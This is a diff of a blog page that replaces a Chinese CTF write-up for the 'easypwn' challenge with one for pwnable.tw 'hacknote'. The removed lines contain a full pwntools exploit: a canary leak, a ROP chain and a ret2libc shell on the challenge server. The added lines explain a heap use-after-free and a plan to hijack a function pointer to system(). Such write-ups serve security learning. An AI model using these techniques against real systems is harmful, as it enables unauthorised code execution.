@@ -3,20 +3,20 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>Ichunqiu_Easypwn | sir</title>
+  <title>pwnable.tw_hacknote | sir</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="轮回池前彼岸花 三生石旁那道疤擦不去的眼中莎 泪眼迷离失去她">
+  <meta name="description" content="一生一世一双人，一词一曲入心门一波一则一浮沉，一刀一剑一伤痕">
 <meta name="keywords" content="writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ichunqiu_Easypwn">
-<meta property="og:url" content="https://cc-sir.github.io/2019/01/28/ichunqiu_easypwn/index.html">
+<meta property="og:title" content="pwnable.tw_hacknote">
+<meta property="og:url" content="https://cc-sir.github.io/2019/02/22/hacknote/index.html">
 <meta property="og:site_name" content="sir">
-<meta property="og:description" content="轮回池前彼岸花 三生石旁那道疤擦不去的眼中莎 泪眼迷离失去她">
+<meta property="og:description" content="一生一世一双人，一词一曲入心门一波一则一浮沉，一刀一剑一伤痕">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-28T13:42:14.151Z">
+<meta property="og:updated_time" content="2019-02-22T15:02:45.305Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ichunqiu_Easypwn">
-<meta name="twitter:description" content="轮回池前彼岸花 三生石旁那道疤擦不去的眼中莎 泪眼迷离失去她">
+<meta name="twitter:title" content="pwnable.tw_hacknote">
+<meta name="twitter:description" content="一生一世一双人，一词一曲入心门一波一则一浮沉，一刀一剑一伤痕">
   
     <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
   
@@ -208,11 +208,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-ichunqiu_easypwn" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-hacknote" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/01/28/ichunqiu_easypwn/" class="article-date">
-      <time datetime="2019-01-28T13:42:14.151Z" itemprop="datePublished">2019-01-28</time>
+      <a href="/2019/02/22/hacknote/" class="article-date">
+      <time datetime="2019-02-22T15:02:45.305Z" itemprop="datePublished">2019-02-22</time>
 </a>
     </div>
   
@@ -225,7 +225,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Ichunqiu_Easypwn
+      pwnable.tw_hacknote
     </h1>
   
 
@@ -246,17 +246,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>轮回池前彼岸花 三生石旁那道疤<br>擦不去的眼中莎 泪眼迷离失去她</p>
+        <p>一生一世一双人，一词一曲入心门<br>一波一则一浮沉，一刀一剑一伤痕</p>
 <a id="more"></a>
 <hr>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>这道题是i春秋CTF的一道题，也是“百度杯”CTF比赛 十二月场中的一道pwn，这道题比较简单<br>我们先看看这道题的保护机制：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ checksec easypwn</span><br><span class="line">[*] <span class="string">'/home/sir/desktop/easypwn'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
-<p>开启了Stack，所以肯定需要我们泄露出Stack；<br>运行程序看看：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ ./easypwn </span><br><span class="line">Hello!I am the smartest robot <span class="keyword">in</span> the universe!</span><br><span class="line">Who are you?</span><br><span class="line">aaaa</span><br><span class="line">Your name aaaa</span><br><span class="line"> sounds so stupid!</span><br><span class="line">But you don<span class="string">'t looks like a fool,isn'</span>t it?</span><br><span class="line">so why don<span class="string">'t tell me your real name?</span></span><br><span class="line"><span class="string">bbbb</span></span><br><span class="line"><span class="string">Oh!This one is better,nice to meet you!</span></span><br><span class="line"><span class="string">Goodbye!See you again!</span></span><br></pre></td></tr></table></figure></p>
-<p>有两个输入点，通过ida查看发现，我们可以第一次输入泄露出stack，然后在第二次输入泄露出某函数的地址找到libc,然后就是计算出system函数和”/bin/sh”字符串的位置，然后再让其跳转会main函数，执行system(“/bin/sh”)，获得shell</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>这是pwnable.tw上面的一道适合入门的堆利用题目，主要是考察对fastbin的申请与释放以及常见漏洞的理解；<br>首先先运行程序了解一下程序的大致内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ ./hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :16</span><br><span class="line">Content :aaaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :3</span><br><span class="line">Index :0</span><br><span class="line">aaaa</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :0</span><br><span class="line">Success</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :4</span><br></pre></td></tr></table></figure></p>
+<p>明显程序有3个主要功能，然后一个退出功能；猜测程序漏洞可能是1中有溢出，2中有double_free或use_after_free或其他，3中有格式化字符串漏洞等<br>通过ida分析，我们发现一个note会先分配8个字节，前四字节指向print功能所要调用的函数，后四节指向note中的具体内容；并且我们最多申请5个note<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( global_amount &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)ptr[i] = puts_4;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      v0 = ptr[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, *((<span class="keyword">void</span> **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">      ++global_amount;</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line"> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>delete会根据给定的索引v1来释放对应的note<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是这里在free的时候没有对v1减一，也没有将指针置为Null，显然，这里是存在use_after_free的情况<br>根据实际的调试我们看到申请的note在堆中是这个样子的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/28x 0x804b150</span><br><span class="line">0x804b150:	0x00000000	0x00000000	0x00000000	0x00000011</span><br><span class="line">0x804b160:	0x0804862b	0x0804b170	0x00000000	0x00000021 <span class="comment">#note0_tag</span></span><br><span class="line">0x804b170:	0x61616161	0x61616161	0x0000000a	0x00000000 <span class="comment">#not0</span></span><br><span class="line">0x804b180:	0x00000000	0x00000000	0x00000000	0x00000011 <span class="comment">#note1_tag</span></span><br><span class="line">0x804b190:	0x0804862b	0x0804b1a0	0x00000000	0x00000021 <span class="comment">#note1</span></span><br><span class="line">0x804b1a0:	0x62626262	0x62626262	0x0000000a	0x00000000</span><br><span class="line">0x804b1b0:	0x00000000	0x00000000	0x00000000	0x00021e49</span><br></pre></td></tr></table></figure></p>
+<p>其中0x0804862b指向的就是puts函数；<br>当我们free(note0)后：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/28x 0x804b150</span><br><span class="line">0x804b150:	0x00000000	0x00000000	0x00000000	0x00000011</span><br><span class="line">0x804b160:	0x00000000	0x0804b170	0x00000000	0x00000021 <span class="comment">#note0_tag</span></span><br><span class="line">0x804b170:	0x00000000	0x61616161	0x0000000a	0x00000000 <span class="comment">#note0</span></span><br><span class="line">0x804b180:	0x00000000	0x00000000	0x00000000	0x00000011 <span class="comment">#note0_tag</span></span><br><span class="line">0x804b190:	0x0804862b	0x0804b1a0	0x00000000	0x00000021 <span class="comment">#note1</span></span><br><span class="line">0x804b1a0:	0x62626262	0x62626262	0x0000000a	0x00000000</span><br><span class="line">0x804b1b0:	0x00000000	0x00000000	0x00000000	0x00021e49</span><br></pre></td></tr></table></figure></p>
 <hr>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process('./easypwn')</span></span><br><span class="line">p = remote(<span class="string">'106.75.2.53'</span>, <span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">'Who are you?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">72</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">72</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0xa</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"cannary: "</span> + hex(canary)</span><br><span class="line">p.recvuntil(<span class="string">'tell me your real name?\n'</span>)</span><br><span class="line">pop_rdi_addr = <span class="number">0x4007f3</span></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x50</span><span class="number">-0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi_addr)</span><br><span class="line">payload += p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(<span class="number">0x4006C6</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'See you again!\n'</span>)</span><br><span class="line">__libc_start_main_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'__libc_start_main_addr:'</span>+hex(__libc_start_main_addr))</span><br><span class="line">system_addr = __libc_start_main_addr + <span class="number">0x24c50</span> //<span class="number">0x24c50</span>是通过网站找到的</span><br><span class="line">binsh_addr = __libc_start_main_addr + <span class="number">0x16c617</span> //<span class="number">0x16c617</span>是通过网站找到的</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr: "</span> + hex(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"got_shell:"</span></span><br><span class="line">p.recvuntil(<span class="string">'Who are you?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">'tell me your real name?\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x50</span><span class="number">-0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>当我们泄露出__libc_start_main函数的地址后，通过网站<a href="https://libc.blukat.me去查询libc的版本,然后就可以找到system函数和&quot;/bin/sh&quot;字符串的地址了" target="_blank" rel="noopener">https://libc.blukat.me去查询libc的版本,然后就可以找到system函数和&quot;/bin/sh&quot;字符串的地址了</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">libc database search</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Query                   show all libs / start over</span><br><span class="line"></span><br><span class="line">__libc_start_main       740</span><br><span class="line"> </span><br><span class="line">+ Find</span><br><span class="line"> </span><br><span class="line">Matches</span><br><span class="line">libc6_2.23-0ubuntu10_amd64</span><br><span class="line">libc6_2.23-0ubuntu3_amd64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc6_2.23-0ubuntu10_amd64                      Download</span><br><span class="line">    Symbol	                Offset	    Difference</span><br><span class="line">	__libc_start_main	0x020740	0x0</span><br><span class="line">	system	                0x045390	0x24c50</span><br><span class="line">	open	                0x0f7030	0xd68f0</span><br><span class="line">	read	                0x0f7250	0xd6b10</span><br><span class="line">	write	                0x0f72b0	0xd6b70</span><br><span class="line">	str_bin_sh	        0x18cd57	0x16c617</span><br><span class="line"></span><br><span class="line">All symbols</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>如果是本地的话也可以使用LibcSearcher来查找libc版本，不过感觉速度慢而且不太准确，但是还是可以参考；而且在泄露函数地址是建议泄露__libc_start_main函数</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>由于fastbin采用的是LIFO原则，所以我们先add两次，但是内容的大小不能是8字节；然后再delete两次,此时note0_tag指向note1_tag,note1指向note0；当我们再次申请一个8字节的note时就会拿到note0_tag，然后我们就可以修改为system函数的地址，当我们再次执行print note0的时候，就可以执行system函数了；<br>所以我们要先泄露system的地址，然后在想办法执行system(‘sh’);<br>由于题目提供了libc，所以我们利用两次use_after_free，先触发一次漏洞来泄露地址，然后再触发一次漏洞来执行system<br>这里有一个小技巧，由于传入note0_tag位置发函数的参数是note0结构体自身，可能无法直接传入字符串“\sh”,这里的知识点是system参数可用“||”截断，比如 system(“chaosir||/sh”)</p>
 
       
       
@@ -266,13 +265,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/01/28/ichunqiu_easypwn/">Ichunqiu_Easypwn</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/22/hacknote/">pwnable.tw_hacknote</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
-        <p><span>发布时间:</span>2019年01月28日 - 21时42分</p>
-        <p><span>最后更新:</span>2019年01月28日 - 21时42分</p>
+        <p><span>发布时间:</span>2019年02月22日 - 23时02分</p>
+        <p><span>最后更新:</span>2019年02月22日 - 23时02分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/01/28/ichunqiu_easypwn/" title="Ichunqiu_Easypwn">https://cc-sir.github.io/2019/01/28/ichunqiu_easypwn/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/01/28/ichunqiu_easypwn/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/22/hacknote/" title="pwnable.tw_hacknote">https://cc-sir.github.io/2019/02/22/hacknote/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/02/22/hacknote/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -285,18 +284,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/01/29/dynelf/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          DynELF
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/01/26/ret2libc/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Ret2libc</div>
+    <a href="/2019/01/29/dynelf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DynELF</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -307,7 +297,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法"><span class="toc-number">1.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-number">1.</span> <span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">2.</span> <span class="toc-text">利用思路</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
@@ -346,13 +336,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/01/29/dynelf/" title="上一篇: DynELF">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2019/01/26/ret2libc/" title="下一篇: Ret2libc">
+            <a href="/2019/01/29/dynelf/" title="下一篇: DynELF">
                 <i class="fa fa-angle-right"></i>
             </a>
         
